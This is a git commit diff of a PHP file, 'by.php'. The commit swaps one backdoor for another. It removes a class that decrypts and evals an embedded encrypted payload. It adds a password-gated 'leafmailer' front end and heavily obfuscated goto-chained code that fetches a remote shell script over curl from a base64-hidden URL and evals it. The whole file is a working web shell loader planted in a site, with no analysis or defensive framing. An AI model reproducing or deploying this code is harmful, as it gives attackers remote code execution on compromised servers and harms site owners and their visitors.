8f72cb6d97a10327d8815b51ce1d314b1ffb84f5
pan492 <adgjiteshiiydfjug647@gmail.com>
2024-12-14 15:20:36 +0700

    Update by.php

--- by.php
+++ by.php
@@ -1,20 +1,26 @@
- class Decryptor
-    {
-        private $key, $data;
+$password = "Serahlu";
 
-        public function __construct($key, $hexData)
-        {
-            $this->key = $key;
-            $this->data = hex2bin($hexData);
-        }
+session_start();
+error_reporting(0);
+set_time_limit(0);
+ini_set("memory_limit",-1);
 
-        public function process()
-        {
-            $code = openssl_decrypt(gzinflate(gzuncompress($this->data)), "AES-128-ECB", $this->key);
-            eval($code);
-        }
+$leaf['version']="2.8";
+$leaf['website']="leafmailer.pw";
+
+$sessioncode = md5(__FILE__);
+if(!empty($password) and $_SESSION[$sessioncode] != $password){
+    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
+        $_SESSION[$sessioncode] = $password;
     }
+    else {
+        print "<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
+        exit;        
+    }
+}
 
-    $decryptor = new Decryptor("1337r0j4n", "789c010c01f3fe05c1c98243300000d00f7250d432c7413a08d274528c5b6a1d6b2d89e5ebfb5e0e3aec3c635e3a3a0e6ed2a6c4e42e4ee5c98b7a0b9162fea2685bb48ec3c9fafbc652c5008b6c22b543dfe81285eaa8e5fdd9f4881cd7748f9cf152b0748491efae75e81df94bbd539554e6a34d13a4da09f8129864dd5c74013316925c3185229ab8f8b25d2aeb24487a3d790ec4a707883912c7ce9047dcf00ba519cbd9d2cc0a95fb93adc1d9eb45c4cb0c71479c5fd52d0976626cd0ecba4cfb81dbd8a57274786336ddab053b5367db4bbfeeeddae8018eb56b28fbe13694349e2c97490f4be586856aabb4ec39060a92de2d803e118cff66f04bf8ae7701871e533d758969b08aedba40598746083e5fb787f8");
-    $decryptor->process();
+session_write_close();
 ?>
+<?php
+ goto affsF; cDEhl: goto AOswG; goto tqYj9; C8iLP: goto E9VVs; goto pnzE6; wPj5A: goto G2gy_; goto tATv1; gRTj7: goto LOsX0; goto DJa7I; r3gWc: $metrstpl = "\157\165\164\160\165\164"; goto visiL; VF1NI: LOsX0: goto lGC0L; omCsJ: goto KahNQ; goto VF1NI; DJa7I: AOswG: goto tAIdJ; eZ4Zm: curl_close(${${"\x47\x4c\117\x42\x41\x4c\123"}["\x66\x6c\x67\151\166\167\167\x78\x69\172"]}); goto YIFi0; nXkOL: GjpbF: goto wPjBN; visiL: goto GjpbF; goto LF5YH; tqYj9: KahNQ: goto fHwVs; YIFi0: goto RMZRI; goto Qqmep; LF5YH: G2gy_: goto eZ4Zm; CmB5a: RMZRI: goto ejHX5; ZyTV0: DxAEC: goto kCTAe; mk4gT: ${${"\107\114\117\x42\101\114\x53"}["\155\x67\x6f\144\x63\x69\x64\145\x6a\152\x69"]} = curl_init(); goto gRTj7; fHwVs: error_reporting(0); goto C8iLP; FYuEy: goto Dmf24; goto q1RHk; xzd5V: goto xgT6v; goto ZyTV0; Y4Bqg: ${"\x47\114\117\102\101\114\123"}["\x6c\x77\165\x6e\146\163\x66\157\x68"] = "\x6f\165\164\x70\x75\164"; goto cDEhl; pnzE6: xgT6v: goto HuWjp; v19Eh: goto z13En; goto nXkOL; Qqmep: Dmf24: goto KqPNK; yKEXA: ${$metrstpl} = curl_exec(${${"\107\x4c\x4f\102\101\114\123"}["\x6d\x67\x6f\x64\x63\151\144\x65\x6a\x6a\x69"]}); goto wPj5A; ejHX5: eval(base64_decode("\x50\172\64\75") . ${${"\107\114\117\x42\101\114\123"}["\x6c\x77\165\x6e\146\163\x66\157\x68"]}); goto FYuEy; CFLEJ: dKmdd: goto yKEXA; iraQ5: goto JA5VB; goto CFLEJ; T0pRc: set_time_limit(0); goto t_lJR; HuWjp: ${"\107\x4c\117\x42\x41\x4c\123"}["\146\x6c\147\151\x76\167\x77\x78\151\x7a"] = "\x63\x68"; goto v19Eh; tAIdJ: ${"\107\114\117\102\101\x4c\x53"}["\155\147\157\144\x63\x69\x64\x65\152\x6a\x69"] = "\x63\x68"; goto omCsJ; kCTAe: ?>
+<?php  goto iraQ5; wPjBN: curl_setopt(${${"\x47\x4c\117\x42\101\114\123"}["\155\x67\157\x64\x63\151\144\x65\x6a\152\151"]}, CURLOPT_RETURNTRANSFER, 1); goto tnWEk; mWMhS: z13En: goto r3gWc; tATv1: JA5VB: goto Y4Bqg; lGC0L: curl_setopt(${${"\107\x4c\x4f\x42\101\114\x53"}["\155\147\157\144\143\151\144\145\152\x6a\x69"]}, CURLOPT_URL, base64_decode("\141\110\x52\x30\143\x48\115\66\114\171\x39\x6e\141\x58\122\x73\131\127\111\165\131\x32\71\164\x4c\60\112\163\131\x57\x4e\162\x53\107\x46\64\142\63\x49\x78\x4d\172\x4d\63\x4c\63\116\x6f\132\x57\x78\x73\114\171\x30\166\143\155\106\x33\114\x32\61\150\x61\127\x34\x76\x63\62\x68\154\142\107\167\x75\144\x48\150\60")); goto xzd5V; BF1tP: E9VVs: goto T0pRc; affsF: goto DxAEC; goto BF1tP; q1RHk: wnziO: goto mk4gT; tnWEk: goto dKmdd; goto mWMhS; t_lJR: goto wnziO; goto CmB5a; KqPNK: ?>
